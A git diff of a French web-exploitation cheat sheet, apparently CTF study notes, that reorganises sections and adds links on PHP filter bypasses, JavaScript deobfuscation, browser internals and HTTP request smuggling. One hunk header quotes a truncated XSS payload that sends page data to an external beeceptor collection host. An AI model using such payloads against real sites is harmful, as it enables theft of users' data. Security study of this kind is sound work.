@@ -43,7 +43,7 @@
 
 - https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Spring%20boot%20-%20Reference%20guide.pdf
 
-*Aussi* (Serveur):
+**Serveur**
 
 ### GraphQL
 
@@ -73,6 +73,7 @@ include("pages/$file");
 ### PHP
 
   - **Bypass `preg_match(" | _/")`** : `.`, ou `]` ou encore d'autres caractères peuvent remplacer `_`:  https://ctftime.org/writeup/11535 
+  -  https://borelenzo.github.io/stuff/2023/10/31/hidden-in-plain-sight.html
   - `Type Juggling` https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
   - `Eval` https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/
   - `Serialize` https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
@@ -111,7 +112,18 @@ https://excess-xss.com/
  
 --------
 
-Client
+**Client**
+
+### Obfu
+
+- https://obf-io.deobfuscate.io/
+- https://js.retn0.kr/
+
+### AST
+
+- https://seal9055.com/blog/browser/browser_architecture
+
+![](./url.png)
 
 ### XSS
  - https://beta.hackndo.com/attaque-xss/
@@ -135,16 +147,10 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 
 [CSP Bypass](https://csplite.com/csp320/)
 
-## AST
 
-- https://seal9055.com/blog/browser/browser_architecture
+### HTTP Smuggling
 
-![](./url.png)
-
-## Obfu
-
-- https://obf-io.deobfuscate.io/
-- https://js.retn0.kr/
+- https://franso.re/fr/blog/http_rs_pour_les_nuls
 
 ## Exercices
 
